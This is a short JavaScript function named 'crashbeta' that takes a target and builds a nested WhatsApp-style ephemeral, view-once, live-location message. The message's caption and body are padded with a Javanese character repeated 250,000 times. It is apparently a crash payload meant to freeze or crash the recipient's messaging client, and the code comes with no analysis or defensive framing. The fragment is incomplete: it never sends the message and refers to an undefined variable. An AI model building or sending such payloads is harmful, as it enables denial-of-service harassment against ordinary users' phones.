async function crashbeta(target, ptcp = false) {
let BetaFc = "KekuatanBatangHitamDicky" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "mengjawa" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}